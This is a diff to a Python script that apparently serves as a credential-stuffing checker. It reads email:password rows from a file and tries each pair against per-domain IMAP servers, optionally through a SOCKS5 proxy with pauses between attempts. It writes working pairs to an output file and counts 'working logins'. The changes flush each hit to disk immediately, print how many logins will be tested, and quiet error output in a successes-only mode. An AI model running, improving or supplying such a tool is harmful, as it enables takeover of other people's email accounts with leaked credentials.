@@ -72,6 +72,7 @@ def result(email, password, success, output_file):
 
     if success and output_file is not None:
         print(email + ':' + password, file = output_file)
+        output_file.flush()
 
 def split_host_port(hostport):
     if hostport.find(':') == -1:
@@ -91,13 +92,13 @@ def split_host_port(hostport):
     else:
         return (host, port)
 
-def test_login(account, domain, password, imap, port, ssl, timeout, socks5_proxy, verbose):
+def test_login(account, domain, password, imap, port, ssl, timeout, socks5_proxy, show_successes, verbose):
     ret = False
 
     if not (validators.domain(imap) or validators.ipv4(imap)):
         error('IMAP server "{}" is not valid.'.format(imap))
 
-        return ret 
+        return ret
 
     try:
         if socks5_proxy:
@@ -120,7 +121,10 @@ def test_login(account, domain, password, imap, port, ssl, timeout, socks5_proxy
             else:
                 connection = imaplib.IMAP4(imap, port = port)
         else:
-            error('Wrong value for "ssl" parameter in "{}"" domain: {}'.format(domain, red(ssl)))
+            if not show_successes:
+                error('Wrong value for "ssl" parameter in "{}"" domain: {}'.format(domain, red(ssl)))
+            else:
+                pass
 
         username = account + '@' + domain
         connection.login(username, password)
@@ -131,8 +135,7 @@ def test_login(account, domain, password, imap, port, ssl, timeout, socks5_proxy
 
         return ret
     except Exception as ex:
-        if verbose:
-            #print("An exception of type {0} occurred. Arguments:\n{1!r}".format(type(ex).__name__, ex.args))
+        if verbose and not show_successes:
             error(ex)
 
         return ret
@@ -181,11 +184,12 @@ def main():
     count_ok = 0
 
     if verbose:
-        print('E-Mails file:  {}'.format(emails_file))
-        print('Output file:   {}'.format(output_file))
-        print('Sleep time:    {} seconds'.format(sleep_time))
-        print('Login timeout: {} seconds'.format(timeout))
-        print('SOCKS5 proxy:  {}'.format(socks5_proxy))
+        print('E-Mails file:      {}'.format(emails_file))
+        print('Logins to test:    {}'.format(len(open(emails_file).readlines())))
+        print('Output file:       {}'.format(output_file))
+        print('Sleep time:        {} seconds'.format(sleep_time))
+        print('Login timeout:     {} seconds'.format(timeout))
+        print('SOCKS5 proxy:      {}'.format(socks5_proxy))
         print()
 
     with open(emails_file, 'r') as emails_file_handle:
@@ -205,7 +209,7 @@ def main():
                         port = config[domain]['port']
                         ssl = config[domain]['ssl']
 
-                        loggedin = test_login(account, domain, password, imap, port, ssl, int(timeout), socks5_proxy, verbose)
+                        loggedin = test_login(account, domain, password, imap, port, ssl, int(timeout), socks5_proxy, show_successes, verbose)
 
                         if show_successes:
                             if loggedin:
@@ -230,10 +234,10 @@ def main():
                     error('Wrong format for row: {}'.format(yellow(row.strip())))
 
     if count_ok == 0:
-        print('Working logins: ' + red(count_ok) + '/' + str(count_all))
+        print('Working logins:    ' + red(count_ok) + '/' + str(count_all))
     else:
         print()
-        print('Working logins: ' + green(count_ok) + '/' + str(count_all))
+        print('Working logins:    ' + green(count_ok) + '/' + str(count_all))
 
     if (output_file is not None and output_file_handle is not None):
         output_file_handle.close()
@@ -241,4 +245,3 @@ def main():
 if __name__ == '__main__':
     signal.signal(signal.SIGINT, signal_handler)
     main()
-    
